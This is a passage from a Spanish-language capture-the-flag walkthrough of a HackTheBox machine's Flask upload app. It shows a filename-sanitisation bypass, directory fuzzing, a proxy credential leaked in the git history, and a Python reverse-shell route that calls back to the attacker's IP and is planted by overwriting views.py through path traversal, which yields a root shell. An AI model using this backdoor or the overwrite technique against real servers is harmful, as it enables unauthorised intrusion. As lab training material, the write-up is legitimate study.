+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_file_name</span>(unsafe_filename):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(unsafe_filename, <span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TODO: get unique filename
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_unique_upload_name</span>(unsafe_filename):
+</span></span><span style="display:flex;"><span>    spl <span style="color:#f92672">=</span> unsafe_filename<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">.&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    file_name <span style="color:#f92672">=</span> spl[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    file_extension <span style="color:#f92672">=</span> spl[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(file_name, <span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> str(current_milli_time()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> file_extension
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Recursively replace a pattern in a string
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recursive_replace</span>(search, replace_me, with_me):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> replace_me <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> search:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> search
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(search<span style="color:#f92672">.</span>replace(replace_me, with_me), replace_me, with_me)
+</span></span></code></pre></div><p>Parece que este script se asegura de que el archivo subido no tenga un nombre que permita la lectura de archivos locales del servidor, es decir, sanitiza los archivos subidos, pues se asegura de que el nombre del archivo subido no tenga <code>../</code>.</p>
+<p>Ahora veamos el archivo <strong>views.py</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
+</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
+</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
+</span></span></code></pre></div><p>Este script se encarga de implementar la parte de la carga de archivos, esto a partir de la función <code>def upload_file</code>. Cuando se envía un archivo (<strong>POST</strong>), sanitiza el nombre del archivo utilizando la función <code>get_file_name</code> del script <strong>utils.py</strong> y lo guarda en la ruta <code>/public/uploads</code> más el nombre del archivo sanitizado. Por último, renderiza una plantilla de <strong>HTML</strong> en donde mostrará la <strong>URL</strong> del host más el <strong>directorio uploads</strong> más el nombre del archivo, ejemplo: <code>http://10.10.11.164/uploads/test.txt</code>.</p>
+<p>En la segunda función, se encarga de obtener el <strong>path del archivo subido</strong> y lo sanitiza con la función <code>get_file_name</code> del script <strong>utils.py</strong>, después envía el archivo a la ruta <code>/public/upload</code> más el <strong>path del archivo</strong>.</p>
+<p>Esta última función es curiosa.</p>
+<p>Probemos su funcionamiento en una sesión de <strong>Python</strong>, cargale la <strong>librería os</strong> para que funcione:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3
+</span></span><span style="display:flex;"><span>Python <span style="color:#ae81ff">3.12.6</span> (main, Sep  <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">2024</span>, <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">15</span>) [GCC <span style="color:#ae81ff">14.2.0</span>] on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">import</span> os
+</span></span></code></pre></div><p>Ahora pasemos la función <code>os.path.join</code> y al último argumento, pongamos un nombre random:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/exploits/public/uploads/test&#39;</span>
+</span></span></code></pre></div><p>Por último, cambiemos el nombre random por uno de un directorio para simular un path:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, <span style="color:#e6db74">&#34;/test&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/test&#39;</span>
+</span></span></code></pre></div><p>Entiendo que, cuando realiza este proceso, evita que podamos aplicar un <strong>ataque LFI o un Directory Trasversal</strong>.</p>
+<p>Vamos a probar la sanitización que se está haciendo para ver si la podemos romper.</p>
+<h3 id="PoC">Prueba de Concepto de Sanitización con BurpSuite</h3>
+<p>Abre <strong>BurpSuite</strong> y captura una subida de un archivo:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura9.png">
+</p>
+<p>Envíala al <strong>Repeater</strong>, borra el nombre del archivo y envía la petición:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura10.png">
+</p>
+<p>Observa que nos suelta información que no debería, siendo esto un <strong>information leakage</strong> y nos da la oportunidad de probar la sanitización que hemos visto que ocurre.</p>
+<p>Agrega solamente puntos en el nombre del archivo y ve que aparecen en el <strong>path</strong> que no deberíamos ver:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura11.png">
+</p>
+<p>Ahora, qué pasa si ponemos una diagonal solamente:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura12.png">
+</p>
+<p>Ya no aparece el <strong>path</strong> de antes, solamente la pura diagonal.</p>
+<p>Por último, probemos lo que pasa si cambiamos el nombre del archivo a <code>../</code>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura13.png">
+</p>
+<p>Parece que lo elimina, pero nos vuelve a mostrar el <strong>path</strong>.</p>
+<p>Acabamos de comprobar que la sanitización sí funciona, pero no es del todo segura, pues si seguimos jugando con puntos y diagonales, encontraremos que sí acepta archivos con doble diagonal.</p>
+<p>Pruébalo:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura14.png">
+</p>
+<p>Esto quiere decir que es posible agregar un archivo a una ruta que queramos, por ejemplo, una <strong>ruta del path</strong> actual de la página web para suplantar un archivo.</p>
+<p>Pero antes de probar esto, veamos si no hay algo que nos falte revisar aplicando <strong>Fuzzing</strong>.</p>
+<h3 id="Fuzz">Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.164/FUZZ
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.11.164/FUZZ
+</span></span><span style="display:flex;"><span>Total requests: 220545
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000003:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">9802</span> L   <span style="color:#ae81ff">92977</span> W    <span style="color:#ae81ff">2359649</span> C   <span style="color:#e6db74">&#34;download&#34;</span>                                          
+</span></span><span style="display:flex;"><span>000003630:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">45</span> L     <span style="color:#ae81ff">144</span> W      <span style="color:#ae81ff">1563</span> Ch     <span style="color:#e6db74">&#34;console&#34;</span>                                             
+</span></span><span style="display:flex;"><span>000045226:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">130</span> L    <span style="color:#ae81ff">420</span> W      <span style="color:#ae81ff">5313</span> Ch     <span style="color:#e6db74">&#34;http://10.10.11.164/&#34;</span>                               
+</span></span><span style="display:flex;"><span>Total time: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">220545</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">220542</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.11.164/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.11.164/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/download             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2489147<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/console              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1563<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">220545</span> / <span style="color:#ae81ff">220546</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Revisemos esa página que encontró llamada <strong>/console</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura15.png">
+</p>
+<p>Parece que podemos entrar a una consola interactiva en la web, pero necesitamos un PIN válido para poder entrar.</p>
+<p>Con esto, ya tenemos 2 formas en las que podemos tratar de ganar acceso a la máquina y vamos a aplicar ambas.</p>
+<h3 id="git">Enumeración de Git</h3>
+<p>Algo que casi se nos olvida, es enumerar el <strong>repositorio de Git</strong> en cuanto a <strong>logs, etiquetas, ramas, etc</strong>.</p>
+<p>Veamos primero que ramas existen:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git branch -a
+</span></span><span style="display:flex;"><span>  dev
+</span></span><span style="display:flex;"><span>* public
+</span></span></code></pre></div><p>Tenemos 2 ramas y algo me dice que en la rama <strong>dev</strong>, vamos a encontrar algo.</p>
+<p>Cambiemos a esa rama y veamos los logs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git log
+</span></span><span style="display:flex;"><span>commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 <span style="color:#f92672">(</span>HEAD -&gt; dev<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:47:24 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ease testing
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:54 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    added gitignore
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:16 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    updated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:45:17 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    initial
+</span></span></code></pre></div><p>Hay varios, te diría que revises todos (que es lo esencial), pero aquí están los <strong>commits</strong> más importantes:</p>
+<ul>
+<li><em>a76f8f75f7a4a12b706b0cf9c983796fa1985820</em></li>
+<li><em>be4da71987bbbc8fae7c961fb2de01ebd0be1997</em></li>
+</ul>
+<p>Si los revisamos, encontraremos lo que parece ser un usuario y contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
+</span></span><span style="display:flex;"><span>commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:16 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    updated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
+</span></span><span style="display:flex;"><span>new file mode <span style="color:#ae81ff">100644</span>
+</span></span><span style="display:flex;"><span>index 0000000..5975e3f
+</span></span><span style="display:flex;"><span>--- /dev/null
+</span></span><span style="display:flex;"><span>+++ b/app/.vscode/settings.json
+</span></span><span style="display:flex;"><span>@@ -0,0 +1,5 @@
+</span></span><span style="display:flex;"><span>+<span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>+  <span style="color:#e6db74">&#34;python.pythonPath&#34;</span>: <span style="color:#e6db74">&#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&#34;</span>,
+</span></span><span style="display:flex;"><span>+  <span style="color:#e6db74">&#34;http.proxy&#34;</span>: <span style="color:#e6db74">&#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&#34;</span>,
+</span></span><span style="display:flex;"><span>+  <span style="color:#e6db74">&#34;http.proxyStrictSSL&#34;</span>: false
+</span></span><span style="display:flex;"><span>+<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Probemos si de pura casualidad sirven en el <strong>servicio SSH</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh dev01@10.10.11.164
+</span></span><span style="display:flex;"><span>dev01@10.10.11.164: Permission denied <span style="color:#f92672">(</span>publickey<span style="color:#f92672">)</span>.
+</span></span></code></pre></div><p>Pues no funcionó y era lo que mencionaba antes, de que no está aceptando credenciales, sino llaves.</p>
+<p>Guardemos esas credenciales para más tarde.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="suplantacion">Suplantando Script views.py de la Página Web para Generar una Backdoor</h3>
+<p>La idea es reemplazar un archivo que permita que ganemos acceso a la máquina, siendo nuestra mejor opción el script <code>views.py</code>.</p>
+<p>Esto porque ya vimos que se encarga de guardar los archivos en una ruta que el usuario puede visitar.</p>
+<p>Abre el script y agrega la siguiente función:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/shell&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_shell</span>():
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;Tu_IP&#34;</span>,<span style="color:#ae81ff">443</span>))
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;sh&#34;</span>)
+</span></span></code></pre></div><p>Esta función va a crear la ruta <strong>/shell</strong>, que cuando visitemos, nos va a mandar una <strong>shell</strong> hacia una <strong>netcat</strong> que tengamos activa, convirtiéndola en una <strong>Reverse Shell/Backdoor</strong>.</p>
+<p>Ahora, debemos suplantar este script y ya probamos que esto es posible.</p>
+<p>Sube el script y captúralo con <strong>BurpSuite</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura16.png">
+</p>
+<p>Una vez que captures la subida, en el campo de <strong>filename</strong>, pongamos la ruta del archivo que queremos suplantar, que sería <code>/app/app/views.py</code>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura17.png">
+</p>
+<p>Dale a <strong>Forward</strong> para enviar la petición y suplantar el script <strong>views.py</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura18.png">
+</p>
+<p>Al parecer funcionó.</p>
+<p>Vamos a comprobarlo:</p>
+<ul>
+<li>Abre una <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Visita la ruta: <code>http://10.10.11.164/shell</code> o aplica un <strong>curl</strong> a esa misma URL:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://10.10.11.164/shell
+</span></span></code></pre></div><ul>
+<li>Observa la <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.164<span style="color:#f92672">]</span> <span style="color:#ae81ff">43260</span>
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># whoami  </span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><ul>
+<li>Listo, ya solo has un tratamiento de la <strong>TTY</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/app <span style="color:#75715e"># python3 -c &#39;import pty;pty.spawn(&#34;sh&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;sh&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># ^Z      </span>
+</span></span><span style="display:flex;"><span>zsh: suspended  nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                 
+</span></span><span style="display:flex;"><span>❯ stty raw -echo; fg
